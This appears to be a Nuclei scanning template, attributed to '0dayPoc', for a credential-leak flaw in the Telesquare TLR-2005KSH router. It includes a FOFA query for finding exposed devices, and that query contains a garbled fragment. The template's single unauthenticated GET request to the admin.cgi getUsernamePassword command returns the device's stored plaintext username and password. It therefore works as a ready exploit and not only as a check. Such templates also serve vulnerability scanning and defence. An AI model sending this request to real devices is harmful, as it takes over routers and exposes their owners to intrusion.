id: telesquare-info-leak

info:
  name: "Telesquare TLR-2005KSH getusernamepassword 接口明文信息泄露"
  author: 0dayPoc
  severity: medium
  description: |-
    fofa: title="TLR-2005KSH"gSecond"
          Telesquare TLR-2005KSH设备通过getusernamepassword接口未正确实施访问控制，可能导致存储认证凭据的明文数据被非授权获取。攻击者可通过构造特定请求直接读取系统中保存的用户名与密码信息。
  tags: telesquare

http:
- raw:
  - |
    GET /cgi-bin/admin.cgi?Command=getUsernamePassword HTTP/1.1
    Host: {{Hostname}}
    Connection: close
    Accept-Encoding: gzip
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'username'
  - type: word
    part: body
    words:
    - 'password'
